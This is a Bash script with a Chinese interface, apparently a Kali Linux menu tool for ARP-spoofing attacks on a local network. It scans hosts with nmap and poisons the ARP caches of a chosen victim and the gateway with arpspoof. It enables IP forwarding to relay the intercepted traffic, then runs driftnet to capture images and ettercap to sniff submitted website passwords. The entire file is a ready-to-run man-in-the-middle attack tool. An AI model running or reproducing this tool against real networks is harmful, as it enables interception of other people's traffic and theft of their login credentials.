#!/bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH

OK="${Green}[OK]${Font}"
Error="${Red}[错误]${Font}"
#fonts color
Green="\033[32m"
Red="\033[31m"
# Yellow="\033[33m"
GreenBG="\033[42;37m"
RedBG="\033[41;37m"
Font="\033[0m"

ID="None"
shell_version="v1.0"
ipaddrinfo="None"
network_card="None"
gateway="None"
aims="0.0.0.0"
arpspoof_screen01="arp01"
arpspoof_screen02="arp02"
driftnet_screen="pic"
ettercap_screen="psw"

# 判断版本
ID=$(cat /etc/*release | grep "^ID=" | sed 's/["ID=]//g')

if [[ "${ID}" == "kali" ]];then
        echo -e "${OK} ${GreenBG} 当前系统为 kali${Font}"
        INS="apt"
        # $INS update
    else
        echo -e "${Error} ${RedBG} 当前系统为 ${ID} 不是支持的系统 -> Kali ${Font}"
        exit 1
    fi

# 安装必备软件
$INS install -y screen


screen -dmS ${arpspoof_screen01}
screen -dmS ${arpspoof_screen02}
screen -dmS ${driftnet_screen}
screen -dmS ${ettercap_screen}

backToMenu(){
read -s -n1 -p "按任意键返回菜单 ... "
echo -e "\n"
}

network_info(){

ifconfig -a
ipaddrinfo=$(ip addr | grep -P "inet 192*" | sed 's/.*inet \([0-9]*[.][0-9]*[.][0-9]*[.][0-9]*[/][0-9]*\).*/\1/g')
gateway=$(ip route show | grep -P "default" | sed 's/.*via \([0-9]*[.][0-9]*[.][0-9]*[.][0-9]*\).*/\1/g')
network_card=$(ip route show | grep -P "default" | sed 's/.*dev \([a-zA-Z]*[0-9]\).*/\1/g')

read -rp "请确认网段-${ipaddrinfo}-是否正确(Y/N): " judge_ip
    [[ -z ${judge_ip} ]] && judge_ip="Y"
    case $judge_ip in
    [yY][eE][sS] | [yY])
        echo -e "${GreenBG} 继续 ${Font}"
        ;;
    *)
        read -rp "请输入正确的网段CIDR(包含掩码): " ipaddrinfo
        ;;
    esac

read -rp "请确认网关-${gateway}-是否正确(Y/N): " judge_gateway
    [[ -z ${judge_gateway} ]] && judge_gateway="Y"
    case $judge_gateway in
    [yY][eE][sS] | [yY])
        echo -e "${GreenBG} 继续 ${Font}"
        ;;
    *)
        read -rp "请输入正确的网关: " gateway
        ;;
    esac

read -rp "请确认网卡-${network_card}-是否正确(Y/N): " judge_card
    [[ -z ${judge_card} ]] && judge_card="Y"
    case $judge_card in
    [yY][eE][sS] | [yY])
        echo -e "${GreenBG} 继续 ${Font}"
        ;;
    *)
        read -rp "请输入正确的网关: " network_card
        ;;
    esac

echo "当前网络: ${ipaddrinfo} 网卡: ${network_card} 网关: ${gateway}"
backToMenu

}

nmap_scan(){

read -rp "请输入扫描的网段(使用CIDR格式-回车默认${ipaddrinfo}): " network_ip
    [[ -z ${network_ip} ]] && network_ip=${ipaddrinfo}
nmap -sP ${network_ip} 
backToMenu

}

arpspoof_control(){

clear
    echo -e "注意：工作环境：${Green}screen${Font} ${RedBG}请新开一个终端,输入命令--> screen -r ${arpspoof_screen01} 或 ${arpspoof_screen02}${Font}"
    for (( k = 1;k < 200; k++))
do
    echo -e "—————————————— 使用向导 ——————————————"""
    echo -e "${RedBG}后台运行在screen的会话-${arpspoof_screen01}和${arpspoof_screen02}-中${Font}"
    echo -e "arpspoof工作指南: ${Green}arpspoof -i <网卡名> -t <欺骗的目标> <我是谁>${Font}"
    echo -e "${Green}0.${Font}  输入目标主机IP"
    echo -e "${Green}1.${Font}  欺骗主机 ${aims} 我是网关 --> 会话-${arpspoof_screen01}"
    echo -e "${Green}2.${Font}  欺骗网关 我是主机 ${aims} --> 会话-${arpspoof_screen02}"
    echo -e "${Green}3.${Font}  返回主菜单"
    read -rp "请输入数字：" choose_arp
    case $choose_arp in
    0)
        read -rp "请输入目标主机IP-目前肉鸡IP=${aims}) " aims
        echo -e "肉鸡IP更改为${Green}${aims}${Font}"
        ;;
    1)
        screen -S ${arpspoof_screen01} -X screen arpspoof -i ${network_card} -t ${aims} ${gateway}
        ;;    
    2)
        screen -S ${arpspoof_screen02} -X screen arpspoof -i ${network_card} -t ${gateway} ${aims}
        ;;
    3)
        k=200
        ;;
    *)
        echo -e "${RedBG}请输入正确的数字${Font}"
        ;;
    esac

done

backToMenu
clear
}

network_traffic(){

read -rp "是否开启ip转发(Y/N),默认Y: " ip_forward
    [[ -z ${ip_forward} ]] && ip_forward="Y"
    case $ip_forward in
    [yY][eE][sS] | [yY])
        echo 1 >/proc/sys/net/ipv4/ip_forward
        echo -e "${GreenBG} 已开启IP转发 ${Font}"
        sleep 2
        ;;
    *)
        echo 0 >/proc/sys/net/ipv4/ip_forward
        echo -e "${RedBG} 已关闭IP转发 ${Font}"
        sleep 2
        ;;
    esac
backToMenu

}

into_screen(){

read -rp "请输入要进入的会话ID或名字(在会话中输入 screen -d 或者快捷键 ctrl+a d 返回，挂起终端): " screen_name
screen -r ${screen_name}

}

delete_screen(){

read -rp "请输入要删除的会话ID或名字: " screen_name
screen -S ${screen_name} -X quit
echo -e "${Green}已删除会话 -${screen_name}${Font}"

}

screen_menu(){
    clear
    for (( j = 1;j < 200; j++))
do
    echo -e "\n\t screen控制面板 ${Red}[${shell_version}]${Font}"
    echo -e "—————————————— 使用向导 ——————————————"""
    echo -e "${Green}0.${Font}  查看终端会话列表"
    echo -e "${Green}1.${Font}  进入某一会话"
    echo -e "${Green}2.${Font}  结束某一会话"
    echo -e "${Green}3.${Font}  返回主菜单"
    read -rp "请输入数字：" menu_num_screen
    case $menu_num_screen in
    0)
        screen -ls
        ;;
    1)
        into_screen
        ;;
    2)
        delete_screen
        ;;
    3)
        j=200
        ;;
    *)
        echo -e "${RedBG}请输入正确的数字${Font}"
        ;;
    esac

done

}



screen_view(){

screen_menu
backToMenu
clear
}

driftnet_attack(){

echo -e "注意：工作环境：${Green}screen${Font} ${RedBG}请新开一个终端,输入命令--> screen -r ${driftnet_screen} ${Font}"
read -s -n1 -p "按任意键确认已开启 ... "
echo -e "\n"
screen -S ${driftnet_screen} -X screen driftnet -i ${network_card}
backToMenu

}

ettercap_attack(){
    
echo -e "注意：工作环境：${Green}screen${Font} ${RedBG}请新开一个终端,输入命令--> screen -r ${ettercap_screen} ${Font}"
read -s -n1 -p "按任意键确认已开启 ... "
echo -e "\n"
screen -S ${ettercap_screen} -X screen ettercap -Tq -i ${network_card}
backToMenu

}


graphic(){
    
echo "    ____                  _   ____             _  __     _ _  "
echo "   / ___|___  _   _ _ __ | |_|  _ \ __ _      | |/ /__ _| (_) "
echo "  | |   / _ \| | | | '_ \| __| |_) / _\` |_____| ' // _\` | | | "
echo "  | |__| (_) | |_| | | | | |_|  _ < (_| |_____| . \ (_| | | | "
echo "   \____\___/ \__,_|_| |_|\__|_| \_\__,_|     |_|\_\__,_|_|_| "

}


menu() {
    graphic
    echo -e "\n\t\t kali-ARP欺骗局域网攻击 ${Red}[${shell_version}]${Font}"
    echo -e "\t\t---authored by Countra---"
    echo -e "\t\thttps://github.com/Countra"
    echo -e "当前使用版本:${shell_version}"
    echo -e "必备tools ${Green}screen${Font} ${Green}nmap${Font} ${Green}arpspoof${Font}"
    echo -e "可选tools ${Green}ettercap${Font} ${Green}driftnet${Font}"

    echo -e "—————————————— 使用向导 ——————————————"""
    echo -e "${Green}0.${Font}  获取当前网络信息"
    echo -e "${Green}1.${Font}  nmap扫描"
    echo -e "${Green}2.${Font}  arpspoof"
    echo -e "${Green}3.${Font}  流量控制(IP转发)"
    echo -e "${Green}4.${Font}  screen查看切换"
    echo -e "—————————————— 需要有图形化桌面 ——————————————"
    echo -e "${Green}5.${Font}  捕获图片"
    echo -e "${Green}6.${Font}  网站密码提交嗅探\n"
    echo -e "${Green}7.${Font}  ${Red}退出${Font} \n"

    read -rp "请输入数字：" menu_num
    case $menu_num in
    0)
        network_info
        ;;
    1)
        nmap_scan
        ;;
    2)
        arpspoof_control
        ;;
    3)
        network_traffic
        ;;
    4)
        screen_view
        ;;
    5)
        driftnet_attack
        ;;
    6)
        ettercap_attack
        ;;
    7)
        exit 0
        ;;
    *)
        echo -e "${RedBG}请输入正确的数字${Font}"
        ;;
    esac
}

main(){

for (( i = 1;i != -1; i++))
do
    menu
done

}

main
